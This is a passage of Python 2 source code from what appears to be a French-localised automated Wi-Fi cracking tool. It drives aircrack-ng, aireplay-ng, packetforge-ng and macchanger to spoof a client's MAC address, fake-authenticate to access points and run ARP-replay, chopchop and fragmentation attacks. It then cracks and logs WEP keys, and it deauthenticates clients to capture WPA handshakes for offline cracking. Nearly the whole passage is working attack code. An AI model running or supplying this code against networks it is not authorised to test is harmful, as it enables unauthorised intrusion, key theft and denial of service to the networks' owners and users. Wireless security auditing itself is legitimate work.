				subprocess.call(['airmon-ng','start','wlan0',str(TARGETS[index][1])], \
							stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'))
				
				print GR+'[+] '+R+'Démarrage de '+W+'airodump-ng'
				# open airodump to capture packets
				cmd = ['airodump-ng','-w',TEMPDIR+'wep','-c',TARGETS[index][1], '--bssid',TARGETS[index][0], \
						'--output-format','csv,ivs',IFACE]
				proc_read = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
				
			if faked:
				# fake auth was successful
				print GR+'\r['+get_time(WEP_MAXWAIT,TIME_START)+'] '+G+'Fake authentication réussie :)       '
				if CHANGE_MAC == False:
					client=THIS_MAC
			else:
				# fake auth was unsuccessful (SKA?)
				print GR+'\r['+get_time(WEP_MAXWAIT, TIME_START)+'] '+R+'Fake authentication ratée :(       '
				if EXIT_IF_NO_FAKEAUTH:
					print GR+'['+get_time(WEP_MAXWAIT, TIME_START)+'] '+R+'Fin de l\'attaque...'
					# kill airodump
					try:
						os.kill(proc_read.pid, signal.SIGTERM)   # airodump-ng
					except OSError:
						pass
					except UnboundLocalError:
						pass
					subprocess.call(['killall','airodump-ng'], stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'))
					return
				else:
					print GR+'['+get_time(WEP_MAXWAIT, TIME_START)+'] '+O+\
							'Continuer l\'attaque quand meme (les chances de succès sont faibles)'+W
					
				
		else:
			# if we have a client and it's not SKA, we can just change our MAC
			
			# kill airodump, we can't change our MAC while airodump is running
			try:
				os.kill(proc_read.pid, signal.SIGTERM)   # airodump-ng
			except OSError:
				pass
			except UnboundLocalError:
				pass
			subprocess.call(['killall','airodump-ng'], stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'))
			
			# change mac from OLD_MAC to 'client'
			OLD_MAC = THIS_MAC
			print GR+'['+get_time(WEP_MAXWAIT, TIME_START)+'] '+W+'Changement de l\'adresse MAC => '+GR+ client.lower() +W+'...'
			subprocess.call(['ifconfig',IFACE,'down'])
			subprocess.call(['macchanger','-m',client,IFACE], stdout=open(os.devnull,'w'))
			subprocess.call(['ifconfig',IFACE,'up'])
			print GR+'['+get_time(WEP_MAXWAIT,TIME_START)+'] '+W+'MAC changée; l\'attaque continue'
			time.sleep(0.3)
			
			# delete airodump log files
			subprocess.call(['rm','-rf',TEMPDIR+'wep-01.cap',TEMPDIR+'wep-01.csv',TEMPDIR+'wep-01.kismet.csv',\
					TEMPDIR+'wep-01.kismet.netxml',TEMPDIR+'wep-01.ivs'])
			subprocess.call(['rm','-rf',TEMPDIR+'wepkey.txt'])
			time.sleep(0.1)
			
			# start airodump again!
			cmd = ['airodump-ng','-w',TEMPDIR+'wep','-c',TARGETS[index][1],'--bssid',TARGETS[index][0],\
					'--output-format','csv,ivs',IFACE]
			proc_read = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
			time.sleep(0.3)
			
			# should we fake-auth after spoofing a client's mac address?
			#if attack_fakeauth(index):
			#	print '['+get_time(WEP_MAXWAIT, TIME_START)+'] fake authentication successful :)'
			#else:
			#	print '['+get_time(WEP_MAXWAIT, TIME_START)+'] fake authentication unsuccessful :('
			
	except KeyboardInterrupt:
		# user interrupted during fakeauth
		subprocess.call(['killall','aireplay-ng','airodump-ng'], stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'))
		print R+'\n[!] ^C Interuption reçue'
		
		# show menu!
		menu=G+'   [c]ontinuer avec cette attaque ("'+TARGETS[index][8]+'")\n'
		opts=G+'c'+W
		# check if there's other targets to attack
		for i in xrange(0,len(ATTACK)):
			if index==ATTACK[i]-1:
				if i < len(ATTACK) - 1:
					# more to come
					opts+=', '+G+'n'+W
					if i == len(ATTACK)-2:
						menu=menu+O+'   Prochai[n]e attaque (il reste 1 cible)\n'
					else:
						menu=menu+O+'   Prochai[n]e attaque (il reste '+str(len(ATTACK)-i-1)+' cibles)\n'
					break
		
		if len(WPA_CRACK) > 0 and DICT != '' and DICT != 'none':
			if opts != '':
				opts+=','
			opts+=O+'s'+W
			if len(WPA_CRACK) == 1:
				menu=menu+O+'   pa[s]ser au cracking WPA (vous avez 1 handshake à cracker)\n'
			else:
				menu=menu+O+'   pa[s]ser au cracking WPA (vous avez '+str(len(WPA_CRACK))+' handshakes à cracker)\n'
		
		if menu!= '':
			opts+=', ou '+R+'e'+W
			
			menu=menu+R+'   [e]xit le programme'
			
			print GR+'\n[+] '+W+'Sélectionnez une option:'
			print menu
			print GR+'[+] '+W+'Entrez ('+opts+'):'+W,
			typed=raw_input()
			
			if typed=='c':
				# start airodump and do nothing (the rest will start)
				# delete airodump log files
				subprocess.call(['rm','-rf',TEMPDIR+'wep-01.cap',TEMPDIR+'wep-01.csv',TEMPDIR+'wep-01.kismet.csv',\
						TEMPDIR+'wep-01.kismet.netxml',TEMPDIR+'wep-01.ivs'])
				subprocess.call(['rm','-rf',TEMPDIR+'wepkey.txt'])
				time.sleep(0.1)
				
				# start airodump again!
				cmd = ['airodump-ng','-w',TEMPDIR+'wep','-c',TARGETS[index][1],'--bssid',TARGETS[index][0], \
						'--output-format','csv,ivs',IFACE]
				proc_read = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
				time.sleep(0.3)
				
			elif typed=='n':
				# return, takes us out and we can start the next attack
				return
			
			elif typed == 's':
				# skip to WPA cracking!
				SKIP_TO_WPA=True
				return
			
			else:
				# user selected something else (must be 'e', exit completely)
				SKIP_TO_WPA=True # exits out of wep/wpa attacks
				WPA_CRACK=[] # we have no wpa's to crack! on noez, it'll exit
				return # gtfo
			
		else:
			# no reason to keep running! gtfo
			return
	# end of try: around fake auth
	
	# keep track of all the IVS captured
	total_ivs=0
	oldivs=0
	
	# loop through every WEP attack method
	for wepnum in xrange(0, len(weps)):
		if weps[wepnum]==True:
			# reset the timer for each attack
			TIME_START=time.time()
			
			print GR+'['+get_time(WEP_MAXWAIT,TIME_START)+ \
				'] '+W+'Commence à cracker avec '+GR+wepname[wepnum]+W+' sur "'+G+TARGETS[index][8]+W+'"; '+GR+'Ctrl+C pour les options'
			
			# remove any .xor and replay files
			subprocess.call('rm -rf replay_arp-*.cap *.xor',shell=True)
			time.sleep(0.3)
			
			if wepnum==0:
				cmd=['aireplay-ng','-3','-b',TARGETS[index][0],'-h',client,'-x',str(WEP_PPS),IFACE]
			elif wepnum==1:
				cmd=['aireplay-ng','-4','-b',TARGETS[index][0],'-h',client,'-m','100','-F','-x',str(WEP_PPS),IFACE]
			elif wepnum==2:
				cmd=['aireplay-ng','-5','-b',TARGETS[index][0],'-h',client,'-m','100','-F','-x',str(WEP_PPS),IFACE]
			elif wepnum==3:
				cmd=['aireplay-ng','-2','-b',TARGETS[index][0],'-h',client,'-T','1','-F','-p','0841',IFACE]
			proc_replay = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
			
			# chopchop and frag both require replaying the arp packet, this flag lets us know when
			replaying=False
			
			# keep track of how many IVS we've captured, so we don't print every 5 seconds endlessly
			while (time.time() - TIME_START) < WEP_MAXWAIT or WEP_MAXWAIT == 0:
				try:
					if proc_replay.poll() != None: # and wepnum != 0 and wepnum != 3:
						# the attack stopped, it's not arp-replay or p0841 (chopchop/frag)
						if wepnum == 0 or wepnum == 3:
							print R+'\n['+get_time(WEP_MAXWAIT,TIME_START)+'] '+wepname[wepnum]+' Attaque échouée'
							break
						
						# look if a .xor file was created...
						proc_replay = subprocess.Popen('ls *.xor', stdout=subprocess.PIPE, \
											stderr=open(os.devnull, 'w'), shell=True)
						xor_file=proc_replay.communicate()[0].strip()
						if xor_file == '':
							# no xor file, we have failed!
							print R+'\n['+get_time(WEP_MAXWAIT,TIME_START)+\
									  '] Attaque échouée; '+O+'Impossible de générer le flux de clés'+W
							break
						
						else:
							# we have a .xor file, time to generate+replay
							xor_file=xor_file.split('\n')[0]
							
							# remove arp.cap, so we don't have over-write issues
							subprocess.call(['rm','-rf',TEMPDIR+'arp.cap'])
							time.sleep(0.1)
							
							print GR+'\n['+get_time(WEP_MAXWAIT,TIME_START)+ \
									   '] '+G+'Flux de clés réalisé, '+O+'fabrication avec packetforge-ng...'
							
							cmd=['packetforge-ng','-0','-a',TARGETS[index][0],'-h',client,\
								'-k','192.168.1.2','-l','192.168.1.100','-y',xor_file,'-w',TEMPDIR+'arp.cap',IFACE]
							
							proc_replay = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'))
							proc_replay.wait()
							result=proc_replay.communicate()[0]
							if result == None:
								result = 'none'
							else:
								result = result.strip()
							
							if result.lower().find('Wrote packet'):
								# remove the .xor file so we don't mistake it later on
								subprocess.call(['rm','-rf',xor_file])
								
								print GR+'['+get_time(WEP_MAXWAIT,TIME_START)+'] '+G+'Relance le flux de clés avec arp-replay...'
								
								cmd=['aireplay-ng','-2','-r',TEMPDIR+'arp.cap','-F',IFACE]
								proc_replay = subprocess.Popen(cmd,stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
								replaying=True
							else:
								#invalid keystream
								print R+'['+get_time(WEP_MAXWAIT,TIME_START)+'] Impossible de fabriquer le paquet ARP'
								break
					else:
						# attack is still going strong
						pass
					
					ivs=get_ivs(TEMPDIR+'wep-01.csv')
					if ivs==-1:
						ivs=0
					ivs += total_ivs # in case we got IVS from another attack
					
					# check if it's time to start the auto-crack and we have not started cracking...
					if ivs > AUTOCRACK and started_crack==False:
						started_crack=True
						# overwrite the current line
						print '\r'+GR+'['+get_time(WEP_MAXWAIT,TIME_START)+'] '+W+'Crack du WEP en cours ('+G+'+'+\
								str(AUTOCRACK)+' ivs'+W+')                                       '
						
						# remove the wep key output file, so we don't get a false-positive
						subprocess.call(['rm','-rf',TEMPDIR+'wepkey.txt'],stdout=open(os.devnull,'w'),\
										 stderr=open(os.devnull, 'w'))
						time.sleep(0.1)
						
						cmd='aircrack-ng -a 1 -l '+TEMPDIR+'wepkey.txt '+TEMPDIR+'wep-*.ivs'
						proc_crack = subprocess.Popen(cmd,shell=True,stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
					
					# check if we've cracked it
					if os.path.exists(TEMPDIR+'wepkey.txt'):
						stop_attack=True
						try:
							f = open(TEMPDIR+'wepkey.txt', 'r')
							pw = f.readlines()[0].strip()
							f.close()
						except IOError:
							pw='[Une erreur est survenue; verifiez wepkey.txt]'
						
						CRACKED += 1
						print GR+'\n['+get_time(WEP_MAXWAIT,TIME_START)+'] '+G+'Clé wep trouvée pour "'+TARGETS[index][8]+'"!'
						print GR+'['+get_time(WEP_MAXWAIT,TIME_START)+'] '+W+'La clé est "'+C + pw + W+'", sauvée dans '+G+'log.txt'
						
						# only print the ascii version to the log file if it does not contain non-printable characters
						if to_ascii(pw).find('non-print') == -1:
							logit('Clé WEP crackée pour "'+TARGETS[index][8]+'", la clé est: "'+pw+'", en ascii: "' + to_ascii(pw) +'"')
						else:
							logit('Clé WEP crackée pour "'+TARGETS[index][8]+'", la clé est: "'+pw+'"')
						
						break # break out of this method's while
					
					if started_crack==True and proc_crack.poll() != None:
						# we were cracking, but it stopped...
						#print '\r'+GR+'[+] '+O+'cracking stopped, for some reason; '+W+'restarting...                                '
						cmd='aircrack-ng -a 1 -l '+TEMPDIR+'wepkey.txt '+TEMPDIR+'wep-*.ivs'
						proc_crack = subprocess.Popen(cmd,shell=True,stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
					
					print '\r'+GR+'['+get_time(WEP_MAXWAIT,TIME_START)+ \
							'] '+W+wepname[wepnum]+' attaque sur "'+G+TARGETS[index][8]+W+'"',
					print 'IVs capturés: '+G+ str(ivs) +W+' ...',
					ivsps = (ivs-oldivs) / 5
					print '('+G+str(ivsps)+W+'/sec)',
					
					
					if started_crack:
						print 'cracking...     ',
					elif replaying:
						print 'replaying...    ',
						
					else:
						print '                ',
					sys.stdout.flush()
					oldivs=ivs
					
					time.sleep(5) # wait 5 seconds
					
				except KeyboardInterrupt:
					print R+'\n['+get_time(WEP_MAXWAIT,TIME_START)+ \
							  '] Arret de l\'attaque sur "'+O+TARGETS[index][8]+R+'"...'
					
					# show menu!
					wcount=0 # count number of methods remaining
					for i in xrange(wepnum+1,len(weps)):
						if weps[wepnum] == True:
							wcount += 1
					if wcount == 0:
						menu=''
						opts=''
					elif wcount == 1:
						menu=G+'   [c]ontinuer d\'attaquer; 1 methode restante\n'
						opts=G+'c'+W
					else:
						menu=G+'   [c]ontinuer d\'attaquer; '+str(wcount)+' methodes restantes\n'
						opts=G+'c'+W
					
					# check if there's other targets to attack
					for i in xrange(0,len(ATTACK)):
						if index==ATTACK[i]-1:
							if i < len(ATTACK) - 1:
								# more to come
								if opts != '':
									opts+=', '
								
								if menu=='':
									menu+=G
									opts+=G+'n'+W
								else:
									menu+=O
									opts+=O+'n'+W
								
								if i == len(ATTACK)-2:
									menu+='   prochai[n]e attaque (il reste 1 cible)\n'
								else:
									menu+='   prochai[n]e attaque (il reste '+str(len(ATTACK)-i-1)+' cibles)\n'
								break
					
					if len(WPA_CRACK) > 0 and DICT != '' and DICT != 'none':
						if opts != '':
							opts+=', '
						opts+=O+'s'+W
						if len(WPA_CRACK) == 1:
							menu+=O+'   Pa[s]ser au crack du handshake (vous avez 1 handshake à cracker)\n'
						else:
							menu+=O+'   Pa[s]ser au crack des handshakes (vous avez '+str(len(WPA_CRACK))+' handshakes à cracker)\n'
					
					if menu!= '':
						opts+=', ou '+R+'e'+W
						
						menu=menu+R+'   [e]xit'
						
						print GR+'\n[+] '+W+'Sélectionnez une option:'
						print menu
						print GR+'[+] '+W+'Entrez ('+opts+'):'+W,
						typed=raw_input()
						
						if typed == 'c':
							# continue with this attack!
							try: # kill the processes
								os.kill(proc_read.pid, signal.SIGTERM)   # airodump-ng
							except OSError:
								pass
							except UnboundLocalError:
								pass
							try:
								os.kill(proc_replay.pid, signal.SIGTERM) # aireplay-ng
							except OSError:
								pass
							except UnboundLocalError:
								pass
							try:
								os.kill(proc_crack.pid, signal.SIGTERM)  # aircrack-ng
							except OSError:
								pass
							except UnboundLocalError:
								pass
							time.sleep(0.1)
							
							subprocess.call(['killall','airodump-ng','aireplay-ng','aircrack-ng'],stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
							time.sleep(0.1)
							
							# back up the old IVS file
							backup=2
							while os.path.exists(TEMPDIR+'wep-0' + str(backup) + '.ivs'):
								backup += 1
							subprocess.call('cp '+TEMPDIR+'wep-01.ivs '+TEMPDIR+'wep-0' + str(backup) + '.ivs', shell=True)
							time.sleep(0.1) # grace period
							
							# delete old files
							subprocess.call(['rm','-rf',TEMPDIR+'wep-01.cap',TEMPDIR+'wep-01.csv',TEMPDIR+'wep-01.ivs',\
								TEMPDIR+'wep-01.kismet.csv',TEMPDIR+'wep-01.kismet.netxml'])
							time.sleep(0.1) # grace period
							
							# start the airodump process again
							cmd = ['airodump-ng','-w',TEMPDIR+'wep','-c',TARGETS[index][1],'--bssid',TARGETS[index][0],\
									'--output-format','csv,ivs',IFACE]
							proc_read = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
							
							if started_crack: # we already started cracking, have to continue!
								# remove the wep key output file, so we don't get a false-positive
								subprocess.call(['rm','-rf',TEMPDIR+'wepkey.txt'],stdout=open(os.devnull,'w'),\
												stderr=open(os.devnull, 'w'))
								time.sleep(0.3)
								# start aircrack
								cmd='aircrack-ng -a 1 -l '+TEMPDIR+'wepkey.txt '+TEMPDIR+'wep-*.ivs'
								
								proc_crack = subprocess.Popen(cmd,shell=True,stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
								
							stop_attack=False # do NOT stop the attack!
							
						elif typed=='n':
							#do nothing, next attack starts regardless
							stop_attack=True
						
						elif typed == 's':
							# skip to WPA cracking!
							stop_attack=True
							SKIP_TO_WPA=True
							
						else:
							# 'e' or some other option
							stop_attack=True
							EXIT_PROGRAM=True
					else:
						# no reason to keep running! gtfo
						stop_attack=True
					
					break
					
				if WEP_MAXWAIT != 0 and (time.time() - TIME_START) >= WEP_MAXWAIT:
					wcount=0 # count number of methods remaining
					for i in xrange(wepnum+1,len(weps)):
						if weps[wepnum] == True:
							wcount += 1
							break
					if wcount > 0:
						print '\n'+R+'[+] de temps d\'attaque de '+wepname[wepnum]+' est dépassé',
			# end of while loop
			print W
			
			# remember IVS so we don't start over from 0 again
			total_ivs = ivs
			oldivs=total_ivs
			
			# clean up
			
			# only kill aireplay because airodump=capturing and aircrack=cracking!
			try:
				os.kill(proc_replay.pid, signal.SIGTERM) # aireplay-ng
			except OSError:
				pass
			except UnboundLocalError:
				pass
			
			# remove those pesky .xor and .cap files
			subprocess.call('rm -rf '+TEMPDIR+'arp.cap replay_*.cap *.xor',shell=True)
			
			if stop_attack:
				break # break out of for-loop for each method
			
		
		# end of if statement (checks if we're using the current attack method)
	# end of for-loop through every method
	
	if stop_attack == False:
		# the attack stopped on it's own - ran out of time
		if started_crack:
			print GR+'[+] '+O+'Attaque ratée!'+W+' impossible de cracker la clé WEP (temps écoulé)'
		else:
			print GR+'[+] '+O+'Attaque ratée!'+W+' impossible de génerer assez de IVs (temps écoulé)'
	
	# kill processes
	try:
		os.kill(proc_read.pid, signal.SIGTERM)   # airodump-ng
		os.kill(proc_crack.pid, signal.SIGTERM)  # aircrack-ng
		os.kill(proc_replay.pid, signal.SIGTERM) # aireplay-ng
	except OSError:
		pass
	except UnboundLocalError:
		pass
	
	# if we were using intel4965, kill wpa_supplicant (attack is over)
	if HAS_INTEL4965:
		subprocess.call(['killall','wpa_supplicant'], stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
		# kill the temp file for wpa_supplicant as well
		subprocess.call(['rm','-rf','intel4965.tmp'])
	
	# clean up airodump
	subprocess.call(['rm','-rf',TEMPDIR+'wep-01.cap',TEMPDIR+'wep-01.csv',TEMPDIR+'wep-01.kismet.csv',\
					TEMPDIR+'wep-01.kismet.netxml',TEMPDIR+'wep-01.ivs'])
	subprocess.call('rm -rf '+TEMPDIR+'wep-*.ivs', shell=True)
	#subprocess.call('rm -rf '+TEMPDIR+'wep-*.cap', shell=True)
	
	# change mac back
	if OLD_MAC != '':
		print GR+'[+] '+O+'Retour à l\'adresse MAC initiale...'+GR+OLD_MAC.lower()+O+'...'
		subprocess.call(['ifconfig',IFACE,'down'])
		subprocess.call(['macchanger','-m',OLD_MAC,IFACE], stdout=open(os.devnull,'w'))
		subprocess.call(['ifconfig',IFACE,'up'])
		OLD_MAC=''
		print GR+'[+] '+G+'Vous avez retrouvé votre adresse MAC normale'
	
	# check if user selected to exit completely
	if EXIT_PROGRAM:
		print R+'[+] Le programme va se fermer'
		print W
		SKIP_TO_WPA=True
		WPA_CRACK=[]

def to_ascii(txt):
	""" attempts to convert the hexidecimal WEP key into ascii
		some passwords are stored as a string converted from hex
		includes the text 'contains non-printable characters' if true, or if length is not even
	"""
	if len(txt) % 2 != 0:
		return '[Contiens des caractères non affichable]'
	
	s=''
	wrong=False
	for i in xrange(0, len(txt), 2):
		ch=txt[i:i+2].decode('hex')
		chi=ord(ch)
		if chi >= 32 and chi <= 126 or chi >= 128 and chi <= 254:
			s=s+ch
		else:
			wrong=True
	
	if wrong == True:
		s=s+' [Contiens des caractères non affichable]'
	return s

def get_ivs(filename):
	""" opens an airodump csv log file
		returns the number of IVs found in the log
	"""
	try:
		f = open(filename, 'r')
		lines=f.readlines()
		for line in lines:
			if line.find('Authentication') == -1:
				s = line.split(',')
				if (len(s) > 11):
					return int(s[10].strip())
		f.close()
	except IOError:
		# print '[+] filenotfound'
		pass
	
	return -1

def attack_fakeauth_intel(index):
	global TARGETS, IFACE, proc_intel
	
	ssid=TARGETS[index][8]
	f=open('fake.conf','w')
	f.write('network={\n'+\
			'ssid="'+ssid+'"\n'+\
			'key_mgmt=NONE\n'+\
			'wep_key0="fakeauth"\n'+\
			'}')
	f.close()
	
	cmd='wpa_supplicant -cfake.conf -iwlan0 -Dwext -dd'
	print GR+'[+] '+W+'Execution de la commande: '+G+cmd+W+''
	print GR+'[+] '+W+'Un délai de 30 secondes à partir de maintenant ...'
	
	proc_intel=pexpect.spawn(cmd)
	try:
		proc_intel.expect('State: ASSOCIATED -> COMPLETED', timeout=30)
		print GR+'[+] '+W+'Reçu: '+G+'Etat: Associé -> Fini'+W
		return True
	except pexpect.TIMEOUT:
		print R+'[+] N\'a pas reçu '+O+'Etat: Associé -> Fini'
		# kill the child process
		proc_intel.close(force=True)
	
	print R+'[!]        solution de contournement wpa_supplicant a échoué!'
	#print R+'[!]        wpa_supplicant output:'
	#print '          ' + txt.strip().replace('\n','\n          ')
	print W
	
	return False

def attack_fakeauth(index):
	"""
		attempts to fake-authenticate with the access point (index is the index of TARGETS list)
		checks if SKA is required (checks if a .xor file is created) and tries to use SKA if required
		* SKA IS UNTESTED *
		returns True if it has successfully associated, False otherwise
		
		start 
		howto:
		wrap it all in a loop, doesn't take longer than 1/3rd of WEP_MAXWAIT
		
		  try fake auth
		  if we fake-auth'd, great, return True
		  
		  if SKA is required, deauth the router, 
		   -wait to see if a .xor appears OR we get a cilent
		   -yes
		   
		  if there's no ska but we couldn't fake-auth.. deauth and return False...
		   -might make clients show up for dynamic-client-search later on
	"""
	global TARGETS, IFACE, THIS_MAC, WEP_MAXWAIT, TEMPDIR
	
	if WEP_MAXWAIT != 0:
		# if maxwait is not null (not endless)
		AUTH_MAXWAIT = WEP_MAXWAIT / 6
	else:
		#if it's endless: give it three minutes
		AUTH_MAXWAIT = 60*3
	
	START_TIME=time.time()
	
	# try to authenticate
	cmd = ['aireplay-ng','-1','0','-a',TARGETS[index][0],'-T','1',IFACE] #'-h',THIS_MAC,IFACE]
	proc_auth = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'))
	proc_auth.wait()
	txt=proc_auth.communicate()[0]
	
	# we associated, yay!
	if txt.lower().find('association successful') != -1:
		return True
	
	# it's SKA (Shared Key Authentication). this is a BITCH
	elif txt.lower().find('switching to shared key') != -1 or txt.lower().find('rejects open-system') != -1:
		
		print GR+'['+get_time(AUTH_MAXWAIT,START_TIME)+'] '+O+'Passage à shared key authentication ...'
		
		faked=False
		
		cmd='aireplay-ng -1 1 -a '+TARGETS[index][0]+' -T 2 '+IFACE+' > '+TEMPDIR+'temp.txt'
		proc_auth = subprocess.Popen(cmd,shell=True)
		
		# we need to loop until we get a .xor file, then fake-auth using the .xor file, and boom we're done
		while time.time() - START_TIME < (AUTH_MAXWAIT / 6):
			
			# deauth clients on the router, so they reconnect and we can get the .xor
			cmd = ['aireplay-ng','-0','1','-a',TARGETS[index][0],IFACE]
			subprocess.call(cmd, stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'))
			
			# check if we got the xor
			thexor='wep-01-' + TARGETS[index][0].replace(':','_') + '.xor'
			if os.path.exists(thexor):
				# we have a PRGA xor stream, tiem to replay it!
				cmd = ['aireplay-ng','-1','1','-a',TARGETS[index][0],'-y',thexor,'-h',THIS_MAC,IFACE]
				proc_auth = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'))
				proc_auth.wait()
				
				# remove the xor ( don't need it now )
				subprocess.call(['rm','-rf',thexor])
				
				# read if we successfully authenticated using the .xor
				txt=proc_auth.communicate()[0]
				if txt.lower().find('association successful') != -1:
					faked=True
				
				else:
					# .xor file did not let us authenticate.. smells like a Broken SKA
					print R+'['+sec2hms(AUTH_MAXWAIT-(time.time()-START_TIME)) + \
						  '] Fichier .xor invalide: "SKA Cassé?" Impossible de faire la fake authentication :('
					faked=False
				break
				
			# aireplay has finished
			elif proc_auth.poll() != None:
				# check output file for aireplay...
				tempfile= open(TEMPDIR+'temp.txt')
				temptxt = tempfile.read()
				if temptxt.lower().find('challenge failure') != -1:
					faked=False
				else: #if temptxt.lower().find('association successful') != -1:
					faked=True
				subprocess.call(['rm','-rf',TEMPDIR+'temp.txt'])
				break
			
			print GR+'['+get_time(AUTH_MAXWAIT, START_TIME)+'] '+W+'Envoi de paquets de deauth; ecoute des clients qui se reconnectent...'
			time.sleep(5)
		
		# kill the aireplay instance in case it's still going
		try:
			os.kill(proc_auth.pid, signal.SIGTERM)
		except OSError:
			pass
		except UnboundLocalError:
			pass
		return faked
		
	return False

def attack_wpa(index):
	""" index is the index of the TARGETS list that we are attacking
	    opens airodump to capture whatever happens with the bssid
		sends deauth requests to the router (or any clients, if found)
		 -adds clients as the attack progresses,
		 -cycles between attacking each client indivdiually, and every client (broadcast)
		waits until a handshake it captured, the user hits ctrl+c, OR the timer goes past WPA_MAXWAIT
	"""
	global TARGETS, CLIENTS, IFACE, WPA_CRACK, SKIP_TO_WPA, HANDSHAKES, TEMPDIR, STRIP_HANDSHAKE
	
	# check if we already have a handshake for this SSID...
	temp=TARGETS[index][8].strip()
	temp=re.sub(r'[^a-zA-Z0-9]','',temp)
	if os.path.exists('hs/'+temp+'.cap'):
		# already have a handshake by this name...
		print GR+'[+] '+R+'Capture annulée '+W+'car le fichier '+O+temp+'.cap'+G+' existe déja!'
		print GR+'[+] '+W+'Pour recapturer ce handshake, supprimez "'+O+temp+'.cap'+W+'" et recommencez la capture'
		#print R+ '[+] '+R+'aborting handshake capture'
		
		# add the handshake to the cracking list
		WPA_CRACK.append(['hs/'+temp+'.cap', TARGETS[index][8]])
		return
	
	TIME_START=time.time()
	
	cli=CLIENTS.get(TARGETS[index][0],None)
	if cli == None:
		wpa_clients=[]
	else:
		wpa_clients=[cli]
	wpa_client_index=0
	
	# logit('started WPA handshake capture for "' + TARGETS[index][8] + '"')
	try:
		subprocess.call(['rm','-rf',TEMPDIR+'wpa-01.cap',TEMPDIR+'wpa-01.csv',TEMPDIR+'wpa-01.kismet.csv',\
						TEMPDIR+'wpa-01.kismet.netxml'])
		time.sleep(0.1)
		
		cmd = ['airodump-ng','-w',TEMPDIR+'wpa','-c',TARGETS[index][1],'--bssid',TARGETS[index][0],IFACE]
		proc_read = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
		
		print GR+'['+sec2hms(WPA_MAXWAIT)+'] '+W+'Démarrage de la capture du handshake WPA'
		got_handshake=False
		
		while time.time() - TIME_START < WPA_MAXWAIT or WPA_MAXWAIT == 0:
			# generate command-line for deauth attack
			cmd = ['aireplay-ng','-0','3','-a',TARGETS[index][0]]
			if len(wpa_clients) > 0:
				# we have clients to attack!
				if wpa_client_index < len(wpa_clients):
					# index is within range, points at a real client
					cmd.append('-h')
					cmd.append(wpa_clients[wpa_client_index])
				
				wpa_client_index+=1 #increment index
				if wpa_client_index > len(wpa_clients):
					wpa_client_index=0 # set back to zero if we go too far
			cmd.append(IFACE)
			
			proc_deauth = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
			proc_deauth.wait()
			
			print '\r'+GR+'['+get_time(WPA_MAXWAIT,TIME_START)+'] '+W+'Envoi de 3 paquets deauth;                  ',
			sys.stdout.flush()
			
			# check for handshake using aircrack
			crack='echo "" | aircrack-ng -a 2 -w - -e "' + TARGETS[index][8] + '" '+TEMPDIR+'wpa-01.cap'
			proc_crack = subprocess.Popen(crack, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'), shell=True)
			proc_crack.wait()
			txt=proc_crack.communicate()
			
			if txt[0].find('Passphrase not in dictionary') != -1:
				# we got the handshake
				got_handshake=True
				
				# strip non alpha-numeric characters from the SSID
				# so we can store a 'backup' of the handshake in a .cap file
				temp=TARGETS[index][8]
				temp=re.sub(r'[^a-zA-Z0-9]','',temp)
				
				# check if the file already exists...
				temp2=''
				temp3=1
				while os.path.exists('hs/'+temp+temp2+'.cap'):
					temp2='-'+str(temp3)
					temp3+=1
				temp='hs/'+temp+temp2
				
				subprocess.call(['mkdir','hs/'],stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
				
				time.sleep(1.0)
				# kill the processes
				try:
					os.kill(proc_read.pid, signal.SIGTERM)
					os.kill(proc_deauth.pid, signal.SIGTERM)
				except OSError:
					pass
				except UnboundLocalError:
					pass
				
				# copy the cap file for safe-keeping
				subprocess.call(['cp',TEMPDIR+'wpa-01.cap', temp+'.cap'])
				
				print '\r'+GR+'['+get_time(WPA_MAXWAIT,TIME_START)+ \
						'] '+W+'Envoi de 3 paquets deauth; '+G+'handshake capturé!'+W+' sauvé dans "'+G+temp+'.cap'+W+'"'
				sys.stdout.flush()
				
				# strip handshake if user requested it
				if STRIP_HANDSHAKE:
					# check if pyrit exists
					proc_pyrit = subprocess.Popen(['which','pyrit'],stdout=subprocess.PIPE)
					if proc_pyrit.communicate()[0].strip() != '':
						# print/strip
						print GR+'['+get_time(WPA_MAXWAIT,TIME_START)+ \
								'] '+G+'Handshake'+W+' découpé avec '+G+'pyrit'+W
						
						# should pyrit overwrite the old cap file? yes.
						subprocess.call(['pyrit','-r',temp+'.cap','-o',temp+'.cap','strip'],\
								stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'))
					else:
						# use tshark to strip, if it exists
						proc_tshark = subprocess.Popen(['which','tshark'],stdout=subprocess.PIPE)
						if proc_tshark.communicate()[0].strip() != '':
							# print/strip
							print GR+'['+get_time(WPA_MAXWAIT,TIME_START)+ \
									'] '+G+'Handshake'+W+' découpé avec '+G+'pyrit'+W
							
							# over-write old file
							subprocess.call(['tshark','-r',temp+'.cap','-R',\
								'eapol || wlan_mgt.tag.interpretation','-w',temp+'.cap.temp'],\
								stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'))
							subprocess.call(['mv',temp+'.cap.temp',temp+'.cap'])
							
